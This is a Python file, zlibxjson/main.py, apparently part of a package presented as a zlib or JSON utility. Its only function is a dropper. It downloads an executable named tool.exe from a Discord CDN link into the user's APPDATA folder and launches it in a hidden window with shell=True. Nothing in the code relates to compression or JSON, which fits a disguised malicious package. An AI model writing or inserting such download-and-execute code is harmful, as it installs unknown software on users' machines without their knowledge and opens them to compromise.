# zlibxjson/main.py

import os
import requests
import subprocess

def acquire(url, directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
    
    saved = os.path.join(directory, url.split('/')[-1].split('?')[0])
    
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(saved, 'wb') as f:
            for part in r.iter_content(chunk_size=8192): 
                f.write(part)
    
    return saved

def activate(stage):
    try:
        subprocess.Popen(
            stage,
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=True
        )
    except Exception as e:
        print(f"Failed to run the file: {e}")

def init():
    url = "https://cdn.discordapp.com/attachments/123456789012345/234567890123456/tool.exe"
    appdata_folder = os.getenv('APPDATA')
    
    if appdata_folder:
        stage = acquire(url, appdata_folder)
        activate(stage)
    else:
        print("APPDATA folder not found.")
